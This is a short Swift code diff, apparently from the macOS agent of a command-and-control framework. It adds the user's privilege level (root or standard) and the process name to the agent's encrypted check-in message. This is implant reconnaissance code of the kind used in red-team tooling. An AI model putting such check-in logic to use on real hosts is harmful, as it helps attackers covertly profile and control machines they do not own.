@@ -87,6 +87,12 @@ func encryptedKeyExchange() -> Bool {
     let sessionKey = try! CC.RSA.decrypt(encryptedSessionKey, derKey: privateKey, tag: toData(string: tag), padding: .oaep, digest: .sha1)
     agentConfig.encodedAESKey = toBase64(data: sessionKey.0)
     
+    // Get integrity_level
+    var integrityLevel = 2 // standard user
+    if (NSUserName() == "root") {
+        integrityLevel = 4 // root user
+    }
+    
     // Assemble plaintext json for checkin message
     jsonPayload = JSON([
         "action": "checkin",
@@ -97,6 +103,8 @@ func encryptedKeyExchange() -> Bool {
         "pid": ProcessInfo.processInfo.processIdentifier,
         "uuid": agentConfig.payloadUUID,
         "architecture": "x64",
+        "integrity_level": integrityLevel,
+        "process_name": ProcessInfo.processInfo.processName,
     ])
     
     // Updated payloadUUID to tempUUID after JSON message creation
